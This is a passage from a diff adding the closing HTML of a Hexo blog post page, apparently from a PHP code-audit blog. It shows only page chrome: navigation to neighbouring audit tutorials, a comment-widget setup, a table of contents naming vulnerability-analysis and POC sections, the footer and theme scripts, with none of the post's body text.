+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PHP/">PHP</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2019/09/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%B8%89%E2%80%94%E2%80%94Thinkphp%E6%A1%86%E6%9E%B6%E7%AF%87/"
+                                   title="PHP代码审计入门篇三——Thinkphp框架篇"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">PHP代码审计入门篇三——Thinkphp框架篇</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2019/05/16/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%BA%8C-%E2%80%94%E2%80%94MVC%E7%BB%93%E6%9E%84%E5%AE%A1%E8%AE%A1/"
+                                   title="PHP代码审计入门篇二 ——MVC结构审计"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">PHP代码审计入门篇二 ——MVC结构审计</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="valine-container">
+        <div id="vcomments"></div>
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script data-pjax
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'uYjIFMUudNVXopwyoQdj70qU',
+              appKey: '9FcDBafKpBdj0IEnf4IQqEQ5',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '',
+              lang: 'en'.toLowerCase()
+            }
+
+            if ('https://uyjifmuu.api.lncldglobal.com') {
+              config.serverURLs = 'https://uyjifmuu.api.lncldglobal.com'
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
+            }
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Q1ngShan</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+                
+                <div class="deploy-info info-item default">
+                    
+                        This site is deployed on <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span>
+                    
+                </div>
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/toggle-theme.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/lazyload.js"></script>
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/post/copyright-info.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/post/share.js"></script>
+        
+    
+
+    <!-- category-page -->
+    
+
+    <!-- links-page -->
+    
+
+    <!-- photos-page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
